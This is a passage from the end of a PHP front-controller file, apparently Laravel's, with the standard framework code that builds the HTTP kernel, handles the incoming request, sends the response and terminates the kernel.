| Once we have the application, we can handle the incoming request
| through the kernel, and send the associated response back to
| the client's browser allowing them to enjoy the creative
| and wonderful application we have prepared for them.
|
*/

$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);

$response = $kernel->handle(
    $request = Illuminate\Http\Request::capture()
);

$response->send();

$kernel->terminate($request, $response);
